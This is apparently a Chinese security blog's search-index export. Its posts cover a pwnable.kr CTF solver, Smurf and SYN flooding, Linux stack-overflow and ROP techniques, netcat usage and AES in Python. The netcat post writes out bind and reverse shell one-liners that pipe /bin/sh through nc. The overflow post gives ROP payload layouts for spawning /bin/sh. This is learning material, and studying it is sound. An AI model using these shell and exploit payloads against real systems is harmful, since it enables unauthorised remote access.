pid; FILE *fp=NULL; //env char *envp[2]=&#123;&quot;\xde\xad\xbe\xef=\xca\xfe\xba\xbe&quot;,NULL&#125;; //argv for(i=0;i&lt;100;i++) argv[i]=&quot;a&quot;; argv[0]=&quot;/home/input2/input&quot;; argv[&apos;A&apos;]=&quot;\x00&quot;; argv[&apos;B&apos;]=&quot;\x20\x0a\x0d&quot;; argv[&apos;C&apos;]=&quot;33333&quot;; argv[100]=NULL; //file fp = fopen(&quot;\x0a&quot;,&quot;wb&quot;); if(!fp) &#123; printf(&quot;open file error&quot;); return 0; &#125; fwrite(&quot;\x00\x00\x00\x00&quot;,4,1,fp); fclose(fp); fp=NULL; //stdio if(pipe(pipe_stdin)&lt;0 || pipe(pipe_stderr)&lt;0) &#123; printf(&quot; pipe error&quot;); return 0; &#125; if((pid=fork())&lt;0) &#123; printf(&quot; fork error&quot;); return 0; &#125; if(pid == 0) &#123; sleep(1); close(pipe_stdin[0]); close(pipe_stderr[0]); write(pipe_stdin[1],&quot;\x00\x0a\x00\xff&quot;,4); write(pipe_stderr[1],&quot;\x00\x0a\x02\xff&quot;,4); &#125; else &#123; close(pipe_stdin[1]); close(pipe_stderr[1]); dup2(pipe_stdin[0],0); dup2(pipe_stderr[0],2); execve(argv[0],argv,envp); &#125; //network sleep(5); int sockfd; struct sockaddr_in saddr; sockfd = socket(AF_INET,SOCK_STREAM,0); if(sockfd == -1) &#123; printf(&quot; create socket error&quot;); return 0; &#125; saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;); saddr.sin_port = htons(33333); if(connect(sockfd, (struct sockaddr *)&amp;saddr,sizeof(saddr))&lt;0) &#123; printf(&quot; connect error&quot;); return 0; &#125; write(sockfd, &quot;\xde\xad\xbe\xef&quot;,4); close(sockfd); return 0;&#125; Pwn–python123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#coding: utf-8import subprocessimport osimport socketimport timepayload = []payload.append(&apos;/home/input2/input&apos;)for i in range(64): payload.append(&apos;a&apos;)payload.append(&apos;&apos;)payload.append(&apos; \n\r&apos;)payload.append(&apos;9999&apos;)for i in range(32): payload.append(&apos;a&apos;)stdinr, stdinw = os.pipe()stderrr, stderrw = os.pipe()os.write(stdinw,&apos;\x00\x0a\x00\xff&apos;)os.write(stderrw,&apos;\x00\x0a\x02\xff&apos;)environ = &#123;&apos;\xde\xad\xbe\xef&apos; : &apos;\xca\xfe\xba\xbe&apos; &#125;f = open(&apos;\n&apos;,&apos;wb&apos;)f.write(&apos;\x00&apos;*4)f.close()s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)print subprocess.Popen(payload,stdin = stdinr , stderr = stderrr , env = environ)time.sleep(2)try: s.connect((&apos;127.0.0.1&apos;,9999))except: print(&quot;fail&quot;) exit(1)s.send(&apos;\xde\xad\xbe\xef&apos;)data = s.recv(2048)print(data)s.close()]]></content>
      <categories>
        <category>ctf</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[O协议攻击]]></title>
    <url>%2F2018%2FWeb%2FProtocol%20Attack%2F</url>
    <content type="text"><![CDATA[Smurf攻击： 发送伪装的ICMP数据包，目的地址设为某个网络的广播地址，源地址设为要攻击的目的主机，使所有收到此ICMP数据包的主机都将对目的主机发出一个回应，使被攻击主机在某一段时间内收到 成千上万的数据包]]></content>
  </entry>
  <entry>
    <title><![CDATA[网络协议之TCP]]></title>
    <url>%2F2018%2FWeb%2Ftcp%2F</url>
    <content type="text"><![CDATA[TCPtcp 特性 tcp提供一种面向连接的，可靠的字节流服务。仅两方通信，不能用于广播和多播。 tcp使用校验和，确认和重传来保证可靠传输 tcp使用滑动窗口来实现流量控制，动态改变窗口大小来进行拥塞控制 tcp 三次握手1.客户端发送 （SYN=1,seq=x）的包，进入SYN_SEND状态。 2.服务器返回（SYN=1,seq=y，ACK=1,ACKnum=x+1），进入SYN_RCVD状态。3.客户端发送（ACK=1,ACKnum=y+1)，进入ESTABLISHED状态，服务器收到这个包，也进入ESTABLISHED状态。总结起来就是，a:你听得到我吗？ b: 我听得到，你听得到我吗？ a：我听得到你 之后开始balabala。。。注意： 第一个包，a发送包后，没有收到b的确认（二次握手包），则会周期性超时重传，直到收到b确认，当然我们客户端可以手动结束。 第二个包，若b发给a的SYN+ACK包，没有得到a的回复，则b会周期性超时重传，直到收到a的确认。 这个阶段可以构成SYN攻击，即a只发送大量的SYN包，造成b（服务器）周期性回复确认包，消耗服务器资源，构成Dos/DDos攻击。检测：netstat -n -p TCP | grep SYN_RECV 防御：1.缩短超时（SYN Timeout）时间,2.增加最大半连接数, 3.过滤网关防护, 4.SYN cookies技术tcp 四次挥手1.客户端发送（FIN=1,seq=x）表示想关闭连接，成功后进入FIN_WAIT_1状态。2.服务器发送（ACK=1,ACKnum=x+1）表示接受到了客户端请求，服务器进入CLOSE_WAIT状态，客户端接受到这个包后，进入FIN_WAIT_2，等待服务器关闭连接。3.服务器发送（FIN=1,seq=y）准备关闭连接，进入LAST_ACK状态。4.客户端发送（ACK=1,ACKnum=y+1)确认包，进入TIME_WAIT，等待可能出现的重传ACK包，服务器收到后进入CLOSED状态，客户端等某个固定时间（2MSL），没收到重传ACK，认为服务器已经关闭连接，客户端关闭连接，进入CLOSED状态。]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[linux 栈溢出总结]]></title>
    <url>%2F2018%2FPwn%2Flinux-%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[进程中内存分段Linux使用虚拟地址空间，每个进程有独立的虚拟地址空间，进程访问的虚拟地址并不是真正的物理地址,这大大增加了进程的寻址空间。由低地址到高地址如下: .text .data .bss 堆–&gt; 未使用与共享库 &lt;–栈 内核 代码段 数据段 未初始化变量 malloc .so 函数使用 用户不可见 栈简介&emsp;&emsp;栈是一种数据结构，是一种具有先进后出性质的队列,由内存高地址向低地址逆向增长，汇编中用push将数据添加到栈，pop从栈中取数据。每个进程都在内存.stack段维持自身栈，与栈相关有两个寄存器：ebp，esp。而函数调用栈是我们栈溢出基础。 函数调用栈 c函数调用栈1 c函数调用栈232位和64位程序在参数保存上有所区别， x86: 参数在eip上方，即栈上。 x64: 前6个参数依次保存在RDI,RSI,RDX,RCX,R8,R9寄存器中，如果多余6个则保存在栈上。 栈溢出原理&emsp;&emsp;程序向栈中某个变量写入字节数超过了变量自己申请的字节数，导致相邻栈中变量值改变，这种称为缓冲区溢出。这种漏洞可使程序崩溃(DOS),还可能让我们控制程序流程(getshell）所以栈溢出前提: 程序能向栈上写数据 写入数据大小未能良好控制 linux下栈保护 cannary（在栈中插入cookie信息，函数返回时验证） FORTIFY (FORTIFY_SOURCE机制对字符串有两个限制 1.包含%n的格式化字符串不能位于程序内存可写位置。2.当使用位置参数时，必须使用范围内的所有参数。即用%6$x,得同时用1,2,3,4,5。 NX（no-execute,堆栈不可执行),(.bss只有对写权限） RELRO (full RELRO, Partial RELRO)（FR设置符号重定向为只读，减少GOT攻击) ALSR 地址空间布局随机化，只有在开启 ASLR 之后，PIE 才会生效 0就是关闭ASLR，没有随机化，堆栈基地址每次都相同，而且libc.so每次的地址也相同。1是普通的ASLR。mmap基地址、栈基地址、.so加载基地址都将被随机化，但是堆没用随机化2是增强的ASLR，增加了堆随机化 PIE叫做代码部分地址无关，PIE能使程序像共享库一样在主存任何位置装载，这需要将程序编译成位置无关，并链接为ELF共享对象。如果不开启PIE的话，那么每次ELF文件加载的地址都是相同的。将端口绑定到程序，模仿远程服务器开启服务：1socat TCP4-LISTEN:9999,fork EXEC:./meet 栈保护绕过ROP(返回导向编程)&emsp;&emsp;Bypass NX and ASLR(程序执行时会使libc.so地址变化)寻找控制寄存器的gdagets：ropgadgets–&gt;$ROPgadget –binary b0verfl0w –only ‘jmp|ret’.text(可用函数）/.bss(写入shellcode再执行它) rop调用系统调用,eg:execve(“/bin/sh”,NULL,NULL)1payload = &apos;A&apos; * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80 NX绕过&emsp;&emsp;Ret2libc–&gt;将eip的值覆盖为libc.so(共享库）的system地址，使执行system(“/bin/sh”)ALSR绕过 libc已知：libc.so函数偏移地址固定，所以泄露某一地址，就可以得到其余地址，一般采用got表泄漏,当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址. libc未知：通过内存泄漏，eg：pwnlib.dynelf, 泄漏函数：puts,write,printf stack pivoting:劫持栈指针指向攻击者控制的内存(堆,栈，.bss)然后rop 1eg: shellcode|padding|fake ebp|jmp esp|set esp to shellcode jmp esp (sub esp,size jmp esp) frame faking:同时控制eip和ebp，改变程序栈帧。payload: 执行两次 leave ret 到达我们伪造的栈帧 1padding | fake ebp|leave ret addr 函数入口： push ebp mov ebp,esp 函数出口： leave–&gt; mov esp,ebp pop ebp || ret—&gt; pop eip伪造栈1fake ebp --&gt; ebp2| target function addr| leave ret addr| arg1|arg2 stack smash当canary被修改，程序执行stack_chk_fail 打印 argv[0]指向的字符串（程序名)劫持 stack_chk_fail的 got 值劫持流程getshell，或泄露内存 partial overwrite:由于内存的页载入机制，PIE的随机化只能影响到单个内存页。通常来说，一个内存页大小为0x1000，这就意味着不管地址怎么变，某条指令的后12位，3个十六进制数的地址是始终不变的 绕过canarycanary实现12345678函数序言时：mov rax, qword ptr fs:[0x28] 向rbp-8插入canarymov qword ptr [rbp - 8], rax函数返回前： 检测cannary是否被修改mov rdx,QWORD PTR [rbp-0x8]xor rdx,QWORD PTR fs:0x28je 0x4005d7 &lt;main+65&gt;call 0x400460 &lt;__stack_chk_fail@plt&gt; Canary 设计为以字节 \x00 结尾，本意是为了保证 Canary 可以截断字符串,溢出泄露canary，并打印。 可以通过劫持 stack_chk_fail的 got 值劫持流程或者利用 stack_chk_fail 泄漏内容fs寄存器指向TLS结构（线程局部存储) fs:0x28指向结构中的stack_guard BROP]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[nc———网络瑞士军刀]]></title>
    <url>%2F2018%2FWeb%2Fnc%E2%80%94%E7%BD%91%E7%BB%9C%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;netcat，瑞士军刀，通过tcp和udp在网络读写数据。能和其他工具或脚本结合使用，做出amazing thing！！你可以通过它做服务器，聊天，传输、下载数据等等。。下面是动手实践： 1.聊天Server—listening1nc -l 9999 Client—connect1nc 127.0.0.1 9999 默认nc会在9999开启一个tcp服务器，输出与输入都在此shell，所以不太友好。。。 2.文件传输传输小文件时，方便快捷。12Server:nc -l 9999 &lt; file1.txt 或 &gt; file2.txt 12Client:nc -n 127.0.0.1 9999 &gt; file1.txt 或 &lt; file2.txt 这里服务器即可发送文件，也能接受文件，不用再将文件源做服务器，‘&gt;’是shell里的重定向。 压缩传输传输各种文件也就是打包，压缩文件(可选）tar 打包； bzip2 压缩12Server:tar -cvf - dirname | bzip2 -z | nc -l 9999 12Client:nc -n 127.0.0.1 9999 | bzip2 -d | tar -xvf - 3.克隆设备将配置好的linux机器重复同样操作对其他机器,骚操作。。。12Server:dd if=/dve/sda | nc -l 9999 12Client:nc -n 127.0.0.2 | dd of=/dev/sda 4.打开shell正向shell客户端得到服务器shell12Server:nc -l 9999 -e /bin/bash -i 不过 -e 好像不好使了。。。不过可以这样123Server:mkfifo /tmp/tmpfifocat /tmp/tmpfifo | /bin/sh -i 2&gt;&amp;1 | nc -l 9999 &gt; /tmp/tmpfifo linux下进程间通信必须通过内核提供的通道，而命名管道fifo文件就是其中之一。从网络收到的数据作为输入写到fifo文件中cat 命令读取fifo文件并且将其内容发送给sh命令sh命令执行收到的输入命令并把输出传给netcat。netcat 通过网络发送输出到client 至于为什么会成功是因为管道使命令平行执行，fifo文件用来替代正常文件，因为fifo使读取等待而如果是一个普通文件，cat命令会尽快结束并开始读取空文件。12Client:nc -n 127.0.0.1 9999 反向shell服务器得到客户端shell12Server:nc -l 9999 12Client:cat /tmp/tmpfifo | /bin/sh -i 2&gt;&amp;1 | nc -n 127.0.0.1 9999 &gt; /tmp/tmpfifo 指定客户端端口，用 -p port 5.指定源地址假设你的机器有多个地址，希望明确指定使用哪个地址用于外部数据通讯。用-s制定 ip12Servernc -u -l 9999 &lt;file.txt 12Clientnc -u 127.0.0.1 9999 -s 196.168.1.3 &gt; file.txt 参考文章:以上内容主要来自这里:https://www.oschina.net/translate/linux-netcat-command]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[学习 python3 AES]]></title>
    <url>%2F2018%2Fpython%2Fpy-AES%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;最近学着堆溢出的各种花式操作时，头快炸了。因此想换个知识过渡一下，一直对木马和病毒有兴趣，想了解具体的实现。今天写木马时遇到了加密的问题，记录一下。 AES简介&emsp;&emsp;AES: Advanced Encryption Standard(高级加密标准),在密码学中又称Rijndael加密法,该算法由比利时密码学家Joan Daemen和Vincent Rijmen所设计，是对称密钥加密中最流行的算法之一。 AES有5种加密操作模式： 电码本模式（Electronic Codebook Book (ECB)）密码分组链接模式（Cipher Block Chaining (CBC)）计算器模式（Counter (CTR)）密码反馈模式（Cipher FeedBack (CFB)）输出反馈模式（Output FeedBack (OFB)） 常见算法说明1.摘要算法&emsp;&emsp;代表：MD5，SHA1。摘要算法是一个不可逆过程&emsp;&emsp;用途：验证消息完整性，安全访问认证，数字签名。 2.对称加密算法&emsp;&emsp;代表：AES，DES。对称加密算法是为了区分非对称加密。&emsp;&emsp;特点：加解密同一密钥，与非对称密钥不一样（有公钥和私钥）&emsp;&emsp;用途：对大型数据加密，加密速度快。 3.非对称加密算法&emsp;&emsp;代表：RSA，Elgamal。非对称加密体系不要求通信双方事先传递密钥或有任何约定就能完成保密通信。&emsp;&emsp;特点：安全性强，密钥管理方便。 4.总结&emsp;&emsp;一般一次数据的传输是几种加密算法的结合，确保数据完整，安全，保密。&emsp;&emsp;先简要了解各种算法，以后再深入了解相关数学原理和破解原理实现，毕竟咱是要走hack路线的。。。 python AES 实现&emsp;&emsp;python中已经有实现AES算法的库了——pycrypto，非标准库，需安装。1pip install pycrypto &emsp;&emsp;python AES中CBC模式的实现，仅适用python3.1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#!/usr/bin/python3#coding:UTF-8#############################File Name:aes1.py#Author: shishen#Mail: shishenwozuile@gmail.com#Created Time: 2017-10-27 22:22:43############################from Crypto.Cipher import AESfrom Crypto import Randomimport base64import sys#padding 算法，填充作用SZ = AES.block_size # AES数据分组为128bit，即16字节pad = lambda s: s + (SZ - len(s.encode('utf-8')) % SZ) *chr(0)class aes: def __init__(self, key, mode): #加密时使用的key，16（AES-128）、24（AES-192）、或32（AES-256） self.key = key self.mode = mode #加密模式 def encrypt(self, text): #生成随机初始向量IV iv = Random.new().read(SZ) #生成指定mode加密算法对象 cryptor = AES.new(self.key, self.mode, iv) cryptext = cryptor.encrypt(pad(text)) #加密 #将密文进行编码，便于传输,decode去掉b return base64.b64encode(iv + cryptext).decode('utf-8') def decrypt(self, cryptext): cryptext = base64.b64decode(cryptext.encode('utf-8')) #解码 iv = cryptext[0:SZ] cryptext = cryptext[SZ:len(cryptext)] #密文 cryptor = AES.new(self.key, self.mode, iv) text = cryptor.decrypt(cryptext).decode('utf-8') #解密 return text.rstrip(chr(0))def main(): ed = aes(b'iamthehellowolrd', AES.MODE_CBC) CBC模式 #argv[1] 需要加密的明文 e = ed.encrypt(sys.argv[1]) d = ed.decrypt(e) print("加密： ",e) print("解密： ",d)if __name__ == '__main__': main() &emsp;&emsp;强调一下AES是对称加密算法，加解密的密钥相同,我们来看一下运行结果123pi@raspberrypi:~/python11/AES $ python3 aes1.py &quot;你好啊，世界！I aM&quot;加密： 3ILPw0i+V2hGadHBq883r/N3bY9MZGyBTpGq+oRRNu5GOmxY1NY+BJSxeOewugNk解密： 你好啊，世界！I aM &emsp;&emsp;这里还要说一下base64，base64不是加密算法，而是一种编码算法。那么为什么用base64呢？&emsp;&emsp; Base64是一种基于64个可打印字符来表示二进制的表示方法，一般用于网络传输,为了支持某些只识别ascii字符的系统。并且有些协议和设备不支持不可见字符传输(产生冲突，错误)，只能传输可打印字符(在ASCII码中规定，0~31、128这33个字符属于控制字符，32~127这95个字符属于可打印字符)，而base64可将不可见字符转换为可见字符，用于传输。]]></content>
      <tags>
        <tag>cypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2017%2FLife%2Fhello-world%2F</url>
    <content type="text"><![CDATA[你好啊，李银河！当我跨过沉沦的一切，向着永恒开战的时候，你是我的军旗。——王小波]]></content>
      <categories>
        <category>others</category>
      </categories>
  </entry>
</search>
